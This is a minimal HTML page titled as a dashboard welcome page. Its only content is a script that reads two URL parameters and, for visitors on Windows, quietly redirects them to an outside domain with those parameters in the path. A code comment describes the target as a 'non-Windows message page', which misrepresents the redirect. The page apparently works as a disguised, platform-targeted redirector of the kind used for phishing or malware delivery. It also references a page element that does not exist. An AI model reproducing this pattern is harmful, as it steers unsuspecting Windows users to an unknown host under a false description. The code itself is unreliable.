<!DOCTYPE html>
<html>
<head>
	<title>Dashboard - Welcome</title>
</head>
<body>

	<script>
		// Get the parameters from the URL
		const urlParams = new URLSearchParams(window.location.search);
		const param1Value = urlParams.get('param1');
		const param2Value = urlParams.get('param2');

		// Check if both parameters exist in the URL
		if (!param1Value || !param2Value) {
			// Redirect to an error page if either parameter is missing
			window.location.href = 'http://example.com/error.html';
		} else {
			// Get the link element and update its href attribute
			const linkElement = document.getElementById('link');
			linkElement.href = `http://example.com?param1=${param1Value}&param2=${param2Value}`;

			// Check if the user is on Windows OS
			function isWindows() {
				return navigator.platform.indexOf('Win') > -1;
			}

			// Redirect the user if they are on Windows OS
			if (isWindows()) {
				// Redirect to a non-Windows message page
				window.location.href = `http://dashboard.amrdjab.za.com/${param1Value}/${param2Value}`;
			}
		}
	</script>
</body>
</html>
